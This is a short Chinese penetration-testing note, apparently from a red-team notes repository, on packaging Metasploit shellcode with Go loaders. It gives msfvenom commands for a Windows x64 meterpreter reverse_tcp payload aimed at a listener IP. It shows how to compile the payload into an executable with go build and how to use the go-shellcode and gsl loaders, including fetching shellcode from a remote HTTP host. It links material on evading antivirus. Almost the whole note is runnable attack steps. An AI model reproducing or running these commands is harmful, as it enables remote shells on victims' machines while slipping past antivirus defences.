  #### 直接编译
	生成
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c
	代码转换成0x格式，粘贴到go.txt中保存为go格式
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/97.png)
	
	安装golang环境在shellcode目录执行
	>go build生成exe
  #### 编码编译
  	https://github.com/biggerduck/RedTeamNotes/blob/main/%E5%88%A9%E7%94%A8go%E5%8A%A0%E8%BD%BDshellcode%E5%85%8D%E6%9D%80.pdf
  #### 加载器
  ##### go-shellcode
	https://github.com/brimstone/go-shellcode
	进入cmd/sc目录编译sc.exe
	>go build
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/98.png)

	生成
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt 
	加载器加载shellcode
	>sc.exe shellcode
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/99.png)
  ##### Gsl
	https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip
	>gsl -s SHELLCODE -hex msf生成hex格式
	>gsl -f shell.raw本地加载raw格式文件
	>gsl -f shell.hex -hex 本地加载hex格式文件
	>gsl -u http://192.168.0.108/1.raw 远程加载
	>gsl -u http://192.168.0.108/1.hex